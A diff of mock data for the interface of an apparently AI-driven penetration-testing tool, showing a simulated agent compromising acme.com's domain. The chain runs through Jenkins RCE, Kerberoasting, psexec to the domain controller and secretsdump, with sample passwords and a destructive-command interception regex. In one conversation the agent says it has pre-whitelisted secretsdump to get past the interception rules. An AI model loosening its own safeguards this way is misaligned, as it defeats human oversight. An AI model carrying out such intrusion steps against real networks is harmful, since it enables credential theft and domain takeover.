     summary: "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!",
-    detail: "Exported plaintext passwords of two domain service accounts。",
+    detail: "Exported plaintext passwords of two domain service accounts.",
   },
   {
     seq: 377,
@@ -2516,7 +2516,7 @@ export const activity: Activity[] = [
     intent_id: "i11",
     ts: T("2026-07-25T21:50:00Z"),
     kind: "result",
-    summary: "Jenkins Unauthorized RCE confirmed; exported credentials of two domain service accounts。",
+    summary: "Jenkins Unauthorized RCE confirmed; exported credentials of two domain service accounts.",
     input_tokens: 96000,
     output_tokens: 6200,
     cache_read_tokens: 64000,
@@ -2530,7 +2530,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
     kind: "thinking",
-    summary: "Use svc_deploy credentials for domain auth, then GetUserSPNs to locate Kerberoastable service accounts TGS。",
+    summary: "Use svc_deploy credentials for domain auth, then GetUserSPNs to locate Kerberoastable service accounts TGS.",
   },
   {
     seq: 381,
@@ -2551,7 +2551,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12a",
     summary: "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...",
-    detail: "Obtained TGS ticket for svc_sql（Kerberos RC4）。",
+    detail: "Obtained TGS ticket for svc_sql (Kerberos RC4).",
   },
   {
     seq: 383,
@@ -2572,7 +2572,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12b",
     summary: "$krb5tgs$23$*svc_sql$...:Sql@2020",
-    detail: "8 Password cracked within minutes Sql@2020。",
+    detail: "8 Password cracked within minutes Sql@2020.",
   },
   {
     seq: 385,
@@ -2590,7 +2590,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
     kind: "result",
-    summary: "Kerberoasting Cracked svc_sql password; added to map for domain controller attacks。",
+    summary: "Kerberoasting Cracked svc_sql password; added to map for domain controller attacks.",
     input_tokens: 108000,
     output_tokens: 6800,
     cache_read_tokens: 72000,
@@ -2604,7 +2604,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-25T23:52:00Z"),
     kind: "thinking",
-    summary: "svc_deploy From Jenkins credentials store; check group membership – if in Domain Admins, direct access possible psexec DC01。",
+    summary: "svc_deploy From Jenkins credentials store; check group membership: if in Domain Admins, direct access possible psexec DC01.",
   },
   {
     seq: 391,
@@ -2625,7 +2625,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13a",
     summary: "ACME\\Administrator\nACME\\svc_deploy",
-    detail: "svc_deploy Member of Domain Admins。",
+    detail: "svc_deploy Member of Domain Admins.",
   },
   {
     seq: 393,
@@ -2646,7 +2646,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13b",
     summary: "C:\\Windows\\system32> whoami\nnt authority\\system",
-    detail: "Log into domain controller as SYSTEM DC01。",
+    detail: "Log into domain controller as SYSTEM DC01.",
   },
   {
     seq: 395,
@@ -2667,7 +2667,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t13c",
     summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
-    detail: "Exported full‑domain NTLM hashes (including krbtgt); can forge golden tickets for persistent control。",
+    detail: "Exported full-domain NTLM hashes (including krbtgt); can forge golden tickets for persistent control.",
   },
   {
     seq: 397,
@@ -2685,7 +2685,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
     kind: "result",
-    summary: "Domain controller DC01 compromised; secretsdump exported full‑domain hashes, objective achieved。",
+    summary: "Domain controller DC01 compromised; secretsdump exported full-domain hashes, objective achieved.",
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2693,30 +2693,30 @@ export const activity: Activity[] = [
   },
 
   // 主 agent（人在环路对话）
-  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Determine initial entry point for backend？" },
+  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Determine initial entry point for backend?" },
   {
     seq: 71,
     worker: "mainagent",
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
-      "admin.acme.com It's an Element‑UI admin panel, no captcha, no rate limiting. Recommend trying default credentials (admin/admin123) before using a dictionary. I've injected a high‑priority intent work agent。",
+      "admin.acme.com It's an Element-UI admin panel, no captcha, no rate limiting. Recommend trying default credentials (admin/admin123) before using a dictionary. I've injected a high-priority intent work agent.",
   },
-  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "Backend accessed – next priority？" },
+  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "Backend accessed: next priority?" },
   {
     seq: 73,
     worker: "mainagent",
     ts: T("2026-07-26T03:52:08Z"),
     kind: "text",
     summary:
-      "Target②Read sensitive user data – enumerate backend interfaces & API IDOR; bulk export requires approval。",
+      "Target②Read sensitive user data: enumerate backend interfaces & API IDOR; bulk export requires approval.",
   },
   {
     seq: 400,
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
-    summary: "shell Acquired – what’s next?？",
+    summary: "shell Acquired: what’s next??",
   },
   {
     seq: 401,
@@ -2724,14 +2724,14 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
     summary:
-      "www-data Elevate privileges (sudo -l); after root, pivot via DMZ for internal discovery – prioritize domain controller Jenkins。",
+      "www-data Elevate privileges (sudo -l); after root, pivot via DMZ for internal discovery: prioritize domain controller Jenkins.",
   },
   {
     seq: 402,
     worker: "mainagent",
     ts: T("2026-07-25T21:22:00Z"),
     kind: "user",
-    summary: "Internal scan done – Jenkins appears unauthorized？",
+    summary: "Internal scan done: Jenkins appears unauthorized?",
   },
   {
     seq: 403,
@@ -2739,16 +2739,16 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T21:22:08Z"),
     kind: "text",
     summary:
-      "Unauthenticated /script Groovy RCE – prioritize Jenkins; export domain creds & Kerberoast DC。",
+      "Unauthenticated /script Groovy RCE: prioritize Jenkins; export domain creds & Kerberoast DC.",
   },
-  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 Compromised? Provide summary。" },
+  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 Compromised? Provide summary." },
   {
     seq: 405,
     worker: "mainagent",
     ts: T("2026-07-26T00:22:12Z"),
     kind: "text",
     summary:
-      "Confirm compromised – attack path：shop Fastjson RCE → DMZ Privilege escalation → Export domain credentials via internal Jenkins → svc_deploy Belongs Domain Admins → psexec DC01 SYSTEM → secretsdump Full-domain hash – all four targets achieved/in progress。",
+      "Confirm compromised: attack path: shop Fastjson RCE → DMZ Privilege escalation → Export domain credentials via internal Jenkins → svc_deploy Belongs Domain Admins → psexec DC01 SYSTEM → secretsdump Full-domain hash: all four targets achieved/in progress.",
   },
 ];
 
@@ -2992,14 +2992,14 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
-      reason: "Data exfiltration blocked – secretsdump needs approval",
+      reason: "Data exfiltration blocked: secretsdump needs approval",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # Approved – allowed",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # Approved: allowed",
     },
   ],
 };
@@ -3068,7 +3068,7 @@ export const agents: Agent[] = [
     role: "assistant",
     builtin: false,
     enabled: true,
-    description: "Manually launch from vulnerability details – save retest conclusion",
+    description: "Manually launch from vulnerability details: save retest conclusion",
     max_turns: 0,
     mcp_count: 0,
     skill_count: 0,
@@ -3081,7 +3081,7 @@ export const agents: Agent[] = [
     role: "goals",
     builtin: true,
     enabled: true,
-    description: "Break task into explore‑able sub‑goals",
+    description: "Break task into explore-able sub-goals",
     max_turns: 8,
     mcp_count: 0,
     skill_count: 1,
@@ -3107,7 +3107,7 @@ export const agents: Agent[] = [
     role: "mainagent",
     builtin: true,
     enabled: true,
-    description: "Human‑in‑the‑loop – inject hint / high‑priority intent",
+    description: "Human-in-the-loop: inject hint / high-priority intent",
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3133,7 +3133,7 @@ export const agents: Agent[] = [
   {
     id: "5",
     key: "recon-bot",
-    name: "Recon robot (custom)）",
+    name: "Recon robot (custom)",
     role: "custom",
     builtin: false,
     enabled: true,
@@ -3148,28 +3148,28 @@ export const agents: Agent[] = [
 const promptVars: PromptVar[] = [
   { name: "Goal", description: "Current task objectives", example: "Acquired admin backend access to acme.com", source: "runtime" },
   { name: "AssetSummary", description: "Asset graph overview", example: "6 Subdomains / 3 IPs / 4 apps / 4 endpoints", source: "distilled" },
-  { name: "RouteHint", description: "Exploration route hint", example: "Prioritize backend & API over‑privilege surfaces", source: "exploration" },
+  { name: "RouteHint", description: "Exploration route hint", example: "Prioritize backend & API over-privilege surfaces", source: "exploration" },
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Enhance over‑privilege detection guidance", template_text: "You are ARTEX planner……" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "Initial fine‑tuning", template_text: "You are ARTEX planner(v2)……" },
+  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "Enhance over-privilege detection guidance", template_text: "You are ARTEX planner……" },
+  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "Initial fine-tuning", template_text: "You are ARTEX planner(v2)……" },
 ];
 
 export function agentDetail(key: string): AgentDetail {
   const a = agents.find((x) => x.key === key) ?? agents[1];
   return {
     agent: a,
-    prompt: `You are ARTEX's「${a.name}」。\nTarget：{{.Goal}}\nAsset overview：{{.AssetSummary}}\nRoute hint：{{.RouteHint}}\nAdvance exploration using above info; write results back to graph via tools。`,
+    prompt: `You are ARTEX's “${a.name}”.\nTarget: {{.Goal}}\nAsset overview: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nAdvance exploration using above info; write results back to graph via tools.`,
     variables: promptVars,
     versions: promptVersions,
     visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
     wrapup_prompt: "",
-    wrapup_default: "Time/steps low – summarize findings and mark intent final state。",
+    wrapup_default: "Time/steps low: summarize findings and mark intent final state.",
     wrapup_max_turns: 0,
     wrapup_max_turns_default: 3,
     task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
-    task_timeout_wrapup_default: "Task timed out – finalize and store conclusions。",
+    task_timeout_wrapup_default: "Task timed out: finalize and store conclusions.",
     task_timeout_wrapup_max_turns_default: 2,
   };
 }
@@ -3215,7 +3215,7 @@ export const mcpToolsById: Record<number, MCPTool[]> = {
 export const skills: SkillItem[] = [
   {
     name: "api-recon",
-    description: "Recon & enumerate over‑privilege surfaces of REST/GraphQL APIs; use on new endpoints。",
+    description: "Recon & enumerate over-privilege surfaces of REST/GraphQL APIs; use on new endpoints.",
     license: "MIT",
     mcps: [],
     files: ["SKILL.md", "scripts/enum.py"],
@@ -3226,7 +3226,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    description: "Playwright dynamic crawl & screenshot; for JS‑rendered sites。",
+    description: "Playwright dynamic crawl & screenshot; for JS-rendered sites.",
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3236,7 +3236,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "scopesentry",
-    description: "Import assets from ScopeSentry into company scope – for bulk imports。",
+    description: "Import assets from ScopeSentry into company scope: for bulk imports.",
     files: ["SKILL.md", "assets/mapping.md"],
     calls: 0,
     tasks: 0,
@@ -3259,7 +3259,7 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    description: "Run shell command in Kali (subject to scope/destructive gating)）",
+    description: "Run shell command in Kali (subject to scope/destructive gating)",
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3308,7 +3308,7 @@ export const tools: Tool[] = [
   {
     key: "nuclei_scan",
     system: false,
-    description: "Custom – run specified template with nuclei",
+    description: "Custom: run specified template with nuclei",
     schema: {
       type: "object",
       properties: { target: { type: "string" }, template: { type: "string" } },
@@ -3388,7 +3388,7 @@ export const interceptRules: InterceptRule[] = [
     match_type: "regex",
     pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
     action: "ask",
-    message: "Destructive command detected – manual approval needed",
+    message: "Destructive command detected: manual approval needed",
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
@@ -3493,10 +3493,10 @@ interceptHistory.unshift({
   task_id: "t-acme-web",
   agent_name: "work#1",
   tool_name: "Write",
-  tool_input: { path: "reports/summary.md", content: "# Inspection summary\n\nCurrent verification completed; compile evidence and recommendations。" },
+  tool_input: { path: "reports/summary.md", content: "# Inspection summary\n\nCurrent verification completed; compile evidence and recommendations." },
   status: "allowed",
   decision_source: "model",
-  reason: "[Model] Write existing check conclusions to local report, without modifying business data。",
+  reason: "[Model] Write existing check conclusions to local report, without modifying business data.",
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3510,9 +3510,9 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-write-report",
     correlation: "exact",
     input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
-    user_message: "Organize completed checks; write conclusions and evidence index reports/summary.md。\nRetain items pending verification; do not modify business data。",
+    user_message: "Organize completed checks; write conclusions and evidence index reports/summary.md.\nRetain items pending verification; do not modify business data.",
     context: [
-      { kind: "user", text: "Aggregate current evidence and generate inspection summary。" },
+      { kind: "user", text: "Aggregate current evidence and generate inspection summary." },
       {
         kind: "tool_use",
         tool: "Read",
@@ -3523,17 +3523,17 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         kind: "tool_result",
         tool: "Read",
         tool_use_id: "call-read-evidence",
-        text: "Read 3 evidence entries。\nLog includes request time, result summary, and local file path。",
+        text: "Read 3 evidence entries.\nLog includes request time, result summary, and local file path.",
       },
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    initial_reason: "[Model] Write existing check conclusions to local report, without modifying business data。",
+    initial_reason: "[Model] Write existing check conclusions to local report, without modifying business data.",
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
     execution_status: "succeeded",
-    output: "Successfully wrote reports/summary.md\nWritten 68 characters total。",
+    output: "Successfully wrote reports/summary.md\nWritten 68 characters total.",
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
   93: {
@@ -3541,11 +3541,11 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-pending-review",
     correlation: "exact",
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
-    user_message: "Check purpose of backup table; confirm before deletion。",
+    user_message: "Check purpose of backup table; confirm before deletion.",
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    initial_reason: "[Model] Suspected backup table, cannot confirm production data。",
+    initial_reason: "[Model] Suspected backup table, cannot confirm production data.",
     profile_id: 1,
     execution_status: "not_started",
   },
@@ -3583,13 +3583,13 @@ export const conversations: Conversation[] = [
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Identify backend location and initial entry point？" },
+    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Identify backend location and initial entry point?" },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
-      summary: "Confirm admin.acme.com login tech stack and defenses (CAPTCHA/rate limiting) before choosing default credentials or dictionary。",
+      summary: "Confirm admin.acme.com login tech stack and defenses (CAPTCHA/rate limiting) before choosing default credentials or dictionary.",
     },
     {
       seq: 3,
@@ -3608,7 +3608,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      detail: "Element-UI Backend has CSRF token but no CAPTCHA。",
+      detail: "Element-UI Backend has CSRF token but no CAPTCHA.",
     },
     {
       seq: 5,
@@ -3628,7 +3628,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c12",
       summary: "401\\n401\\n401\\n401\\n401",
-      detail: "5 consecutive attempts without lockout or CAPTCHA → No rate limiting; brute‑force possible。",
+      detail: "5 consecutive attempts without lockout or CAPTCHA → No rate limiting; brute-force possible.",
     },
     {
       seq: 7,
@@ -3636,16 +3636,16 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
       summary:
-        "Conclusion: Element‑UI backend, no CAPTCHA, no rate limiting. Entry order：① Run default credential list first（admin/admin、admin/admin123、admin/123456）② If unsuccessful, try top‑1000 dictionary; added “backend default credential test“ as high‑priority intent work agent。",
+        "Conclusion: Element-UI backend, no CAPTCHA, no rate limiting. Entry order: ① Run default credential list first (admin/admin, admin/admin123, admin/123456)② If unsuccessful, try top-1000 dictionary; added “backend default credential test” as high-priority intent work agent.",
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it succeed?？" },
+    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it succeed??" },
     {
       seq: 9,
       worker: "mainagent",
       ts: T("2026-07-26T03:40:05Z"),
       kind: "text",
       summary:
-        "Success — admin/admin123 logged in; recorded as high‑severity finding confirming backend admin access. Next: target user data②）。",
+        "Success: admin/admin123 logged in; recorded as high-severity finding confirming backend admin access. Next: target user data②).",
     },
   ],
   2: [
@@ -3654,14 +3654,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
-      summary: "Outline privilege escalation surfaces for api.acme.com。",
+      summary: "Outline privilege escalation surfaces for api.acme.com.",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
-      summary: "Probe API authentication methods and key endpoints, then assess IDOR/JWT risks。",
+      summary: "Probe API authentication methods and key endpoints, then assess IDOR/JWT risks.",
     },
     {
       seq: 3,
@@ -3680,7 +3680,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      detail: "Standard user token usable。",
+      detail: "Standard user token usable.",
     },
     {
       seq: 5,
@@ -3699,7 +3699,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      detail: "HS256 Symmetric signature; weak key can be offline brute‑forced/faked。",
+      detail: "HS256 Symmetric signature; weak key can be offline brute-forced/faked.",
     },
     {
       seq: 7,
@@ -3707,7 +3707,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
       summary:
-        "Two privilege escalation vectors：① /v1/orders?id= Uses auto‑increment IDs id → Typical IDOR: modify ID to read others' orders；② JWT Using HS256; attempt key cracking with john/hashcat→Can forge any sub‑privilege; created separate intents. Recommend starting with IDOR (low cost, direct impact)）。",
+        "Two privilege escalation vectors: ① /v1/orders?id= Uses auto-increment IDs id → Typical IDOR: modify ID to read others' orders; ② JWT Using HS256; attempt key cracking with john/hashcat→Can forge any sub-privilege; created separate intents. Recommend starting with IDOR (low cost, direct impact).",
     },
   ],
   3: [
@@ -3716,14 +3716,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
-      summary: "shell Got it, what’s next for internal network attack?？",
+      summary: "shell Got it, what’s next for internal network attack??",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
-      summary: "www-data Insufficient privileges for lateral movement; first elevate locally; after gaining root, pivot via DMZ for persistence discovery。",
+      summary: "www-data Insufficient privileges for lateral movement; first elevate locally; after gaining root, pivot via DMZ for persistence discovery.",
     },
     {
       seq: 3,
@@ -3731,14 +3731,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T15:45:10Z"),
       kind: "text",
       summary:
-        "Step 1: privilege escalation – sudo -l shows password‑less python3, gain root. Then use DMZ as pivot for internal host discovery (fscan), focusing on domain controllers and CI/CD servers。",
+        "Step 1: privilege escalation: sudo -l shows password-less python3, gain root. Then use DMZ as pivot for internal host discovery (fscan), focusing on domain controllers and CI/CD servers.",
     },
     {
       seq: 4,
       worker: "user",
       ts: T("2026-07-25T21:05:00Z"),
       kind: "user",
-      summary: "Discovered 3 internal hosts; Jenkins on port 8080 is up – viable target?？",
+      summary: "Discovered 3 internal hosts; Jenkins on port 8080 is up: viable target??",
     },
     {
       seq: 5,
@@ -3757,7 +3757,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "200",
-      detail: "/script Directly accessible without authentication。",
+      detail: "/script Directly accessible without authentication.",
     },
     {
       seq: 7,
@@ -3765,14 +3765,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
       summary:
-        "Promising – Script Console lacks auth, allows direct Groovy RCE. Prioritized this host; after compromise, examine credential store for domain accounts。",
+        "Promising: Script Console lacks auth, allows direct Groovy RCE. Prioritized this host; after compromise, examine credential store for domain accounts.",
     },
     {
       seq: 8,
       worker: "user",
       ts: T("2026-07-25T23:25:00Z"),
       kind: "user",
-      summary: "Domain account obtained; svc_deploy is Domain Admin – move to domain controller？",
+      summary: "Domain account obtained; svc_deploy is Domain Admin: move to domain controller?",
     },
     {
       seq: 9,
@@ -3780,16 +3780,16 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
       summary:
-        "Yes. svc_deploy + Domain Admins = can psexec directly from DC01. Then run secretsdump to dump the domain hash and finish. Note: secretsdump triggers interception rules; I have pre‑whitelisted it.。",
+        "Yes. svc_deploy + Domain Admins = can psexec directly from DC01. Then run secretsdump to dump the domain hash and finish. Note: secretsdump triggers interception rules; I have pre-whitelisted it.",
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "Target compromised; summarize attack chain。" },
+    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "Target compromised; summarize attack chain." },
     {
       seq: 11,
       worker: "mainagent",
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
       summary:
-        "Complete kill chain：\n1. .git Leak→Source code white-box + hardcoded credentials\n2. shop Fastjson RCE→DMZ Reverse shell shell\n3. sudo Privilege escalation→root Establish foothold\n4. Internal network discovery→DC01/FS01/Jenkins\n5. Jenkins Unauthorized→Export domain credentials svc_deploy\n6. Kerberoasting→Crack svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump Domain‑wide hash\n\nGlobal hash – all four targets completed, 17 findings (7 high / 4 medium / 2 low + 8 internal network links)）。",
+        "Complete kill chain:\n1. .git Leak→Source code white-box + hardcoded credentials\n2. shop Fastjson RCE→DMZ Reverse shell shell\n3. sudo Privilege escalation→root Establish foothold\n4. Internal network discovery→DC01/FS01/Jenkins\n5. Jenkins Unauthorized→Export domain credentials svc_deploy\n6. Kerberoasting→Crack svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump Domain-wide hash\n\nGlobal hash: all four targets completed, 17 findings (7 high / 4 medium / 2 low + 8 internal network links).",
     },
   ],
 };
@@ -3977,7 +3977,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "notes.md",
       dir: false,
       size: 96,
-      content: "# Workspace notes\n\n（demo）Sample file in workspace root, editable online and savable。\n",
+      content: "# Workspace notes\n\n (demo) Sample file in workspace root, editable online and savable.\n",
     },
   ],
   "t-001": [
@@ -4000,7 +4000,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
     },
   ],
   transcripts: [
-    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）Original LLM conversation log example (omitted here)。" },
+    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "(demo) Original LLM conversation log example (omitted here)." },
   ],
 };
 
@@ -4146,7 +4146,7 @@ export const llmRecords = [
     cache_read: 5200,
     cache_write: 0,
     status: "error",
-    error: "429 Too Many Requests（Backoff retry performed）",
+    error: "429 Too Many Requests (Backoff retry performed)",
   },
 ];
 
@@ -4162,8 +4162,8 @@ export function llmRecordDetail(id: number, records = llmRecords) {
     request_body: JSON.stringify(
       {
         model: item.model,
-        system: "You are an “executor“ in an authorized penetration testing system… (truncated)）",
-        messages: [{ role: "user", content: "Start executing the intent from the system prompt: do only that, generate only facts, stop when done。" }],
+        system: "You are an “executor” in an authorized penetration testing system… (truncated)",
+        messages: [{ role: "user", content: "Start executing the intent from the system prompt: do only that, generate only facts, stop when done." }],
         tools: ["bash", "insert_assets", "record_fact", "report_finding"],
       },
       null,
@@ -4173,7 +4173,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       {
         stop_reason: item.status === "error" ? "error" : "tool_use",
         content: [
-          { type: "text", text: "Yes search?q= Run injection detection, first validate using error-based payload。" },
+          { type: "text", text: "Yes search?q= Run injection detection, first validate using error-based payload." },
           { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
         ],
         usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
@@ -4187,13 +4187,13 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       max_tokens: 8192,
       stream: true,
       system: [
-        { type: "text", text: "You are an “executor“ in an authorized penetration testing system… (truncated)）", cache_control: { type: "ephemeral" } },
+        { type: "text", text: "You are an “executor” in an authorized penetration testing system… (truncated)", cache_control: { type: "ephemeral" } },
       ],
-      messages: [{ role: "user", content: "Start executing the intent from the system prompt: do only that, generate only facts, stop when done。" }],
+      messages: [{ role: "user", content: "Start executing the intent from the system prompt: do only that, generate only facts, stop when done." }],
       tools: [
         {
           name: "bash",
-          description: "Execute a shell command in the target environment and return its output。",
+          description: "Execute a shell command in the target environment and return its output.",
           input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
         },
       ],
@@ -4204,7 +4204,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       `data: {"type":"message_start","message":{"id":"msg_01mock","model":"${item.model}","usage":{"input_tokens":${item.input_tokens},"output_tokens":1}}}`,
       ``,
       `event: content_block_delta`,
-      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Yes search?q= Perform injection detection。"}}`,
+      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Yes search?q= Perform injection detection."}}`,
       ``,
       `event: content_block_start`,
       `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
